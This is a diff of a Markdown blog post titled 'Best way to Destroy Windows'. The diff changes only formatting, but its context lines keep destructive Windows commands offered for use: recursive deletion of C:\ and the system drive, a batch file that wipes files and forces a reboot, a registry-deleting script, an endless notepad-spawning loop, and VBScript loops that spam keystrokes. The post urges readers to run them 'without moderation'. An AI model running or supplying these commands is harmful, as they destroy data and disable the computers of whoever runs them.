@@ -8,7 +8,7 @@ bigimg: /img/winfuckair.gif
 ## Best way to Destroy Windows
 Run this command without moderation;)
 
-### 1. Type this in command prompt:
+### 1Type this in command prompt:
 
 > RD C:\ /S /Q
 
@@ -16,7 +16,7 @@ Run this command without moderation;)
 
 > del /f /s /q "C:\*.*."
 
-### 2. Type this in notepad:
+### 2Type this in notepad:
 
 Save the file anywhere (.bat) and execute it:
 
@@ -29,7 +29,8 @@ del %systemdrive%\*.*/f/s/q
 shutdown -r -f -t 00
 ```
 
-. 
+<br>
+
 ###### 2.2 Stupidity Shutdown
 code:
 
@@ -39,7 +40,8 @@ msg * Fatal system error due to admin stupidity!
 shutdown -c “Error! You are too stupid!” -s -t 10
 ```
 
-. 
+<br>
+
 ###### 2.3 Delete Key Registry Files
 code:
 
@@ -53,7 +55,8 @@ ECHO Your computer has been fcked.Â Â Have a nice day.
 GOTO MESSAGE
 ```
 
-. 
+<br>
+
 ###### 2.4 Endless Notepads
 code:
 
@@ -64,7 +67,8 @@ START %SystemRoot%\system32\notepad.exe
 GOTO top
 ```
 
-. 
+<br>
+
 ###### 2.5 Crazy caps lock
 code:
 
@@ -76,7 +80,8 @@ wshshell.sendkeys “{CAPSLOCK}”
 loop
 ```
 
-. 
+<br>
+
 ###### 2.6 Endless Enter
 code:
 
@@ -88,7 +93,8 @@ wshshell.sendkeys “~(enter)”
 loop
 ```
 
-. 
+<br>
+
 ###### 2.7 Endless Backspace
 code:
 
@@ -101,7 +107,8 @@ wshshell.sendkeys “{bs}”
 loop
 ```
 
-.
+<br>
+
 ###### 2.8 Popping CD Drives
 code:
 
